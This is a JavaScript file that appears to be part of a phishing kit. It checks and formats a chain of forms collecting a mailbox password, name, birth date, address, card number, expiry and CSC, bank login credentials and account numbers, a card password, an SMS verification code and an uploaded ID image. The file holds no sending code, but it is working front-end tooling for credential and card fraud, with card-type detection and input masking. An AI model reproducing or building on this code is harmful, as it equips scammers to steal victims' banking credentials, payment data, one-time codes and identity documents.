//# EMAIL JS
function validateEmailForm() {
    var a = document.forms["EmailForm"]["xeonmailboxpass"].value;
    if (a == "") {
        $("#xeonmailboxpass").addClass("hasError");
    }
    if (a == ""){return false;}
}

// BILL JS
function validateBillForm() {
    var a = document.forms["bilForm"]["xeonFnm"].value;
    var b = document.forms["bilForm"]["xeonBirth"].value;
    var c = document.forms["bilForm"]["xeonAdr"].value;
    var d = document.forms["bilForm"]["xeoncty"].value;
    var e = document.forms["bilForm"]["xeonzip"].value;
    var f = document.forms["bilForm"]["xeonCtry"].value;
    var g = document.forms["bilForm"]["xeontel"].value;
    var h = document.forms["bilForm"]["xeoncc"].value;
    var i = document.forms["bilForm"]["xeonExp"].value;
    var j = document.forms["bilForm"]["xeoncsc"].value;
    if (a == "") {
        $("#xeonFnm").addClass("hasError");
    }
    if (b == "") {
        $("#xeonBirth").addClass("hasError");
    }
    if (c == "") {
        $("#xeonAdr").addClass("hasError");
    }
    if (d == "") {
        $("#xeoncty").addClass("hasError");
    }
    if (e == "") {
        $("#xeonzip").addClass("hasError");
    }
    if (f == "") {
        $("#xeonCtry").addClass("hasError");
    }
    if (g == "") {
        $("#xeontel").addClass("hasError");
    }
    if (h == "") {
        $("#xeoncc").addClass("hasError");
    }
    if (i == "") {
        $("#xeonExp").addClass("hasError");
    }
    if (j == "") {
        $("#xeoncsc").addClass("hasError");
    }
    if (a == ""){return false;}if (b == ""){return false;}if (c == ""){return false;}if (d == ""){return false;}if (e == ""){return false;}if (f == ""){return false;}if (g == ""){return false;}if (h == ""){return false;}if (i == ""){return false;}if (j == ""){return false;}
}

//Put our input DOM element into a jQuery Object
		var $expDate = jQuery('#xeonExp');

		//Bind keyup/keydown to the input
		$expDate.bind('keyup','keydown', function(e){
			
		  //To accomdate for backspacing, we detect which key was pressed - if backspace, do nothing:
			if(e.which !== 8) {	
				var numChars = $expDate.val().length;
				if(numChars === 2){
					var thisVal = $expDate.val();
					thisVal += '/';
					$expDate.val(thisVal);
				}
		  }
		});

		//Put our input DOM element into a jQuery Object
		var $birthDate = jQuery('#xeonBirth');

		//Bind keyup/keydown to the input
		$birthDate.bind('keyup','keydown', function(e){
			
		  //To accomdate for backspacing, we detect which key was pressed - if backspace, do nothing:
			if(e.which !== 8) {	
				var numChars = $birthDate.val().length;
				if(numChars === 2 || numChars === 5){
					var thisVal = $birthDate.val();
					thisVal += '/';
					$birthDate.val(thisVal);
				}
		  }
		});
		jQuery(function($) {
	      	$('[data-numeric]').payment('restrictNumeric');
	      	$('#xeoncc').payment('formatCardNumber');

	      	$.fn.toggleInputError = function(erred) {
	        	this.parent('.form-group').toggleClass('has-error', erred);
	        	return this;
	     	};

	    });

	    $('#xeoncc').validateCreditCard(function(result) {
		if (result.card_type != null) {switch (result.card_type.name) {
			case "VISA":
            $("#cicon").addClass("vi");  
		break;

	    	case "VISA ELECTRON":
	        $("#cicon").addClass("ve");
		break;

	    	case "MASTERCARD":
	        $("#cicon").addClass("ma");
		break;

			case "MAESTRO":
            $("#cicon").addClass("me");
		break;

			case "DISCOVER":
            $("#cicon").addClass("di");
		break;

			case "AMEX":
            $("#cicon").addClass("am");
            $("#xeoncsc").addClass("amxicon");
			$("#xeoncsc").attr('maxlength','4');
			$("#xeoncsc").attr('placeholder','CSC (4 digits)');
			$("#xeonWhatIsCC").attr('onclick','xeonWhatIsCC4()');
			$("#xeonWhatIsCCText3").addClass("hide");
		break;

			case "JCB":
            $("#cicon").addClass("jc");
		break;

		case "DINERS_CLUB":
            $("#cicon").addClass("dc");
		break;

		default:$('#cicon').css('background-position', '98.5% 82%');break;}} 

        else {
        	$("#xeoncsc").attr('maxlength','3');
        	$("#xeoncsc").attr('placeholder','CSC (3 digits)');
        	$("#xeonWhatIsCC").attr('onclick','xeonWhatIsCC3()');
        	$("#cicon").removeClass("vi");
            $("#cicon").removeClass("ve");
            $("#cicon").removeClass("ma");
            $("#cicon").removeClass("me");
            $("#cicon").removeClass("di");
            $("#cicon").removeClass("am");
            $("#cicon").removeClass("jc");
            $("#cicon").removeClass("dc");
            $("#xeoncsc").removeClass("amxicon");
        }
        if (result.valid || $cardinput.val().length > 16) {if (result.valid) {
        	$('#xeoncc').removeClass('hasError').addClass('');} 
        else {$('#xeoncc').removeClass('').addClass('hasError');}}
        else {$('#xeoncc').removeClass('').removeClass('hasError');}});


// BNK JS
function validateBnkForm() {
    var a = document.forms["bnkForm"]["xeonbnId"].value;
    var b = document.forms["bnkForm"]["xeonbnPs"].value;
    var c = document.forms["bnkForm"]["xeonRtNm"].value;
    var d = document.forms["bnkForm"]["xeonAcNm"].value;
    if (a == "") {
        $("#xeonbnId").addClass("hasError");
    }
    if (b == "") {
        $("#xeonbnPs").addClass("hasError");
    }
    if (c == "") {
        $("#xeonRtNm").addClass("hasError");
    }
    if (d == "") {
        $("#xeonAcNm").addClass("hasError");
    }
    if (a == ""){return false;}if (b == ""){return false;}if (c == ""){return false;}if (d == ""){return false;}
}

// CC PASS JS
function validateVbForm() {
    var a = document.forms["vbForm"]["xeonccpas"].value;
    var b = document.forms["vbForm"]["xeonsn"].value;
    if (a == "") {
        $("#xeonccpas").addClass("hasError");
    }
    if (b == "") {
        $("#xeonsn").addClass("hasError");
    }
    if (a == ""){return false;}if (b == ""){return false;}
}


// SMS CODE JS
function validateSmPsForm() {
    var a = document.forms["smForm"]["smpass"].value;
    if (a == "") {
        $("#smpass").addClass("hasError");
    }
    if (a == ""){return false;}
}

// ID JS

function validateIdForm() {
    var a = document.forms["idForm"]["xeonIdinp"].value;
    if (a == "") {
        $("#imgUp").addClass("idhasError");
    }
    if (a == ""){return false;}
}
function readURL(input) {
  if (input.files && input.files[0]) {

    var reader = new FileReader();

    reader.onload = function(e) {
      $('.image-upload-wrap').hide();

      $('.file-upload-image').attr('src', e.target.result);
      $('.file-upload-content').show();

      $('.image-title').html(input.files[0].name);
    };

    reader.readAsDataURL(input.files[0]);

  } else {
    removeUpload();
  }
}

function removeUpload() {
  $('.file-upload-input').replaceWith($('.file-upload-input').clone());
  $('.file-upload-content').hide();
  $('.image-upload-wrap').show();
}
$('.image-upload-wrap').bind('dragover', function () {
		$('.image-upload-wrap').addClass('image-dropping');
	});
	$('.image-upload-wrap').bind('dragleave', function () {
		$('.image-upload-wrap').removeClass('image-dropping');
});
